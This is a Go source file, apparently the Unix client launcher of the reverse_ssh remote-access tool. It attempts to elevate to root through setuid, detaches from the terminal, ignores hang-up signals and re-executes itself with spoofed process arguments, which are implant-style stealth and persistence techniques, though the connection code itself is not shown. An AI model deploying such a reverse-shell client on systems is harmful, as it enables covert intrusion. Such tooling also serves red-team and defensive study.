//go:build !windows

package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
)

func normalizeSelfPath(path string) string {
	if path == "" {
		return ""
	}

	if unquoted, err := strconv.Unquote(path); err == nil {
		path = unquoted
	} else {
		path = strings.Trim(path, "\"'")
	}

	return path
}

func isProcPath(path string) bool {
	return strings.HasPrefix(path, "/proc/")
}

func Run(settings *client.Settings) {
	//Try to elavate to root (in case we are a root:root setuid/gid binary)
	syscall.Setuid(0)
	syscall.Setgid(0)

	//Create our own process group, and ignore any  hang up signals
	syscall.Setsid()
	signal.Ignore(syscall.SIGHUP, syscall.SIGPIPE)

	// on the linux platform we cant use winauth
	client.Run(settings)
}

func selfExecCandidates(settings *client.Settings) []string {
	candidates := make([]string, 0, 4)
	seen := make(map[string]bool)
	add := func(path string) {
		path = normalizeSelfPath(path)
		if path == "" || seen[path] {
			return
		}
		if isProcPath(path) {
			return
		}
		seen[path] = true
		candidates = append(candidates, path)
	}

	if settings != nil && settings.SelfPath != "" {
		add(settings.SelfPath)
	}

	if len(os.Args) > 0 && os.Args[0] != "" {
		if p, err := exec.LookPath(os.Args[0]); err == nil {
			add(p)
			if abs, err := filepath.Abs(p); err == nil {
				add(abs)
			}
		}

		if abs, err := filepath.Abs(os.Args[0]); err == nil {
			add(abs)
		}
	}

	if p, err := os.Executable(); err == nil {
		add(p)
	}

	return candidates
}

func Fork(settings *client.Settings, pretendArgv ...string) error {

	log.Println("Forking")

	candidates := selfExecCandidates(settings)
	if len(candidates) == 0 {
		return fmt.Errorf("unable to resolve self path for re-exec")
	}

	var lastErr error
	for _, candidate := range candidates {
		err := fork(candidate, nil, pretendArgv...)
		if err == nil {
			return nil
		}

		log.Println("Forking from", candidate, "failed:", err)
		lastErr = err
	}

	return lastErr
}
